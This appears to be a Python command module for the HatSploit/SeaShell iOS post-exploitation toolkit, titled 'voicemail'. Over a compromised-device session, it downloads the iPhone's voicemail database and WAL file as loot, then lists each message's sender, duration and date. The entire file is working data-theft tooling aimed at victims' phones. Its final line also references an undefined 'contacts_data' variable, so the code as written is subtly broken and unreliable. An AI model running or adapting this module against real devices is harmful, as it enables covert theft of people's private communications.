"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.lib.loot import Loot

from pex.db import DB
from pex.string import String

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "voicemail",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "View Voicemail data.",
            'Usage': "voicemail",
            'MinArgs': 0
        }

        self.db = DB()

        self.db_file = '/private/var/mobile/Library/Voicemail/voicemail.db'
        self.wal_file = '/private/var/mobile/Library/Voicemail/voicemail.db-wal'

    def run(self, argc, argv):
        if not self.session.download(
                self.db_file, Loot().specific_loot('voicemail.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('voicemail.db-wal')):
            return

        self.print_process("Parsing voicemail database...")

        try:
            voicemail = self.db.parse_voicemail(
                Loot().specific_loot('voicemail.db'))
        except Exception:
            self.print_error("Failed to parse voicemail database!")
            return

        voicemail_data = []
        for item in voicemail:
            voicemail_data.append((
                item['data']['sender'],
                item['data']['duration'],
                item['data']['date']
            ))

        if voicemail_data:
            self.print_table("Voicemail", ('Sender', 'Duration', 'Date'), *contacts_data)
        else:
            self.print_warning("No voicemail available on device.")
